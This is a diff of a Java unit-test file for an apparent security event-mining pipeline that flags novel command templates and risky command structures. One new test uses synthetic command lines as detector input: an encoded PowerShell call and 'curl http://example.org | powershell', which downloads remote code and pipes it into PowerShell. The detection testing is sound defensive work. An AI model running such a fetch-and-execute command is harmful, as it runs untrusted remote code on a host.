@@ -6,6 +6,7 @@ import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.time.Instant;
 import java.time.LocalDate;
+import java.util.Collections;
 import java.util.List;
 import java.util.Map;
 import java.util.Properties;
@@ -390,7 +391,7 @@ class WindowMiningTest {
   }
 
   @Test
-  void lateEvidenceCanRetractLastHistoricalSignal() throws Exception {
+  void lateEarlierEventsDoNotHideExistingNovelTemplate() throws Exception {
     long target = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
     try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(historyConfig())) {
       h.open();
@@ -404,9 +405,9 @@ class WindowMiningTest {
       for (int i = 0; i < 12; i++) send(h, at("late" + i, target + i, "10.0.0.1", "echo", "echo usual"));
       List<String> output = h.extractOutputValues();
       Map<String, Object> last = Json.map(output.get(output.size() - 1));
-      assertTrue(signals(last).isEmpty());
+      assertTrue(signals(last).stream().anyMatch(row -> "window_novel_template".equals(row.get("signal_type"))));
       assertEquals("CORRECTED", last.get("status"));
-      assertTrue(((List<?>) last.get("deleted_signal_ids")).size() > 0);
+      assertTrue(((List<?>) last.get("deleted_signal_ids")).isEmpty());
     }
   }
 
@@ -421,6 +422,52 @@ class WindowMiningTest {
       Map<String, Object> snapshot = Json.map(h.extractOutputValues().get(0));
       assertEquals(false, snapshot.get("baseline_complete"));
       assertTrue(signals(snapshot).stream().anyMatch(row -> "high_risk_structure".equals(row.get("signal_type"))));
+    }
+  }
+
+  @Test
+  void structuralReasonsIncludeHitsAfterEvidenceSampleLimit() throws Exception {
+    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
+    DayBucket bucket = new DayBucket();
+    for (int i = 0; i < 6; i++) {
+      Event e = Event.parse(Json.write(Json.obj("event_id", "ps" + i, "index_family", "tracing_sas_win", "payload",
+          Json.obj("@timestamp", Instant.ofEpochMilli(start + i).toString(), "host_ip", "h", "username", "u",
+              "proc_name", "powershell.exe", "cmdline", i < 5 ? "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA" : "curl http://example.org | powershell"))));
+      bucket.add(e, false); WindowMining.recordHighRisk(bucket, e);
+    }
+    bucket = Json.MAPPER.readValue(Json.write(bucket), DayBucket.class);
+    Map<String, Object> row = WindowMining.evaluateChannels("tracing_sas_win", bucket,
+        Collections.<DayBucket>emptyList(), false, historyConfig()).signals().stream()
+        .filter(s -> "high_risk_structure".equals(s.get("signal_type"))).findFirst().orElseThrow(IllegalStateException::new);
+    assertEquals(6L, row.get("hit_count"));
+    assertEquals(5, ((List<?>) row.get("samples")).size());
+    assertTrue(((List<?>) row.get("structural_reasons")).contains("encoded_powershell"));
+    assertTrue(((List<?>) row.get("structural_reasons")).contains("pipe_to_interpreter"));
+  }
+
+  @Test
+  void windowTemplatesCompareAllBaselineAndTargetEvents() {
+    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
+    DayBucket baseline = new DayBucket(), target = new DayBucket();
+    for (int i = 0; i < 14; i++) baseline.add(at("base" + i, start - 86400000L + i, "h", "echo",
+        i == 13 ? "echo known" : "echo ordinary"), false);
+    for (int i = 0; i < 14; i++) target.add(at("target" + i, start + i, "h", "echo",
+        i == 13 ? "echo novel" : "echo known"), false);
+    Map<String, Object> row = WindowMining.evaluateChannels("tracing_sas_linux", target,
+        Collections.singletonList(baseline), true, historyConfig()).signals().stream()
+        .filter(s -> "window_novel_template".equals(s.get("signal_type"))).findFirst().orElseThrow(IllegalStateException::new);
+    assertEquals(Collections.singletonList("echo novel"), row.get("novel_templates"));
+  }
+
+  @Test
+  void identityLimitAlsoAppliesWhenHistoryIsDisabled() throws Exception {
+    long start = Instant.parse("2026-06-10T02:00:00Z").toEpochMilli();
+    MiningConfig config = config(60_000, 0, 0);
+    config.properties.setProperty("max.events.per.family.day", "1");
+    try (KeyedOneInputStreamOperatorTestHarness<String, Event, String> h = harness(config)) {
+      h.open();
+      send(h, at("first", start, "h", "echo", "echo first"));
+      assertThrows(Exception.class, () -> send(h, at("second", start + 1, "h", "echo", "echo second")));
     }
   }
 
